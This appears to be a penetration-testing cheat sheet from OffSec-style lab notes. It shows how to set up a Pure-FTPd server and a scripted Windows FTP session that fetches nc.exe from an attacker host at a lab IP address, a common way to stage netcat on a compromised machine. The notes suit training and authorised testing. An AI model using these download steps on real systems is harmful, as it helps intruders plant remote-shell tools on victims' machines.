# pure-ftpd
> Pure-FTPd is a free FTP Server with a strong focus on software security. It can be compiled and run on a variety of Unix-like computer operating systems including Linux, OpenBSD, NetBSD, FreeBSD, DragonFly BSD, Solaris, Tru64, Darwin, Irix and HP-UX. It has also been ported to Android.  

- - - -
## Server
`apt-get install pure-ftpd`

### Create user
```bash
#!/bin/bash 
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser 
pure-pw useradd offsec -u ftpuser -d /ftphome 
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart 
```

- - - -
## Client
```cmd
echo open 10.11.0.5 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt 
```

- - - -